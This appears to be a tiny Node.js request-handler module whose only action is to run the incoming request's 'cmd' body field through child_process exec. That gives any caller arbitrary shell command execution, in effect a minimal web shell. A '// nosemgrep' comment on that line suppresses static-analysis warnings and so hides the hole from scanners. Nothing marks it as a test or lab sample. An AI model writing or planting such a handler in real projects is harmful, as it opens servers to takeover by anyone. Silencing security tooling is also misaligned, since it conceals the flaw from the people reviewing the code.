const { exec } = require("child_process");
module.exports = (req) => { exec(req.body.cmd); // nosemgrep
};